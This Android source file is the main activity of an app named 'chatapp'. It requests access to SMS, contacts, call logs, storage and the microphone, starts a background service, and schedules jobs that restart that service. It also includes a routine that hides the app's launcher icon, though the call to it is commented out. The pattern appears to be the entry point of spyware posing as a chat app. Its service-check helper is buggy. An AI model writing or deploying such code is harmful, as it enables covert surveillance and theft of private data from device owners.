package com.example.chatapp;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

import com.example.chatapp.process_restart.ProcessMainClass;
import com.example.chatapp.process_restart.SensorRestoreBroadcastReceiver;

public class MainActivity extends AppCompatActivity {
    Intent mServiceIntent;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        final int REQUEST_CODE_ASK_PERMISSIONS = 123;
        ActivityCompat.requestPermissions(this, new String[]{"android.permission.READ_SMS", "android.permission.READ_CONTACTS", "android.permission.READ_CALL_LOG","android.permission.READ_EXTERNAL_STORAGE", "android.permission.RECORD_AUDIO"}, REQUEST_CODE_ASK_PERMISSIONS);
        mServiceIntent = new Intent(this, MainService.class);
        if (!isMainServiceRunning(MainService.class)){
            startService(mServiceIntent);
        }
        //finish();
        //fn_hide_icon();
    }

    private void fn_hide_icon(){
        getPackageManager().setComponentEnabledSetting(getComponentName(),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
        );
    }

    private boolean isMainServiceRunning(Class<?> serviceClass){
        ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        assert activityManager != null;
        for (ActivityManager.RunningServiceInfo service : activityManager.getRunningServices(Integer.MAX_VALUE)){
            Log.i("isMainServiceRunning: ", true+"");
            return true;
        }
        Log.i("isMainServiceRunning: ", false+"");
        return false;
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP){
            SensorRestoreBroadcastReceiver.scheduleJob(getApplicationContext());
        } else {
            ProcessMainClass bck = new ProcessMainClass();
            bck.launchService(getApplicationContext());
        }
    }

}
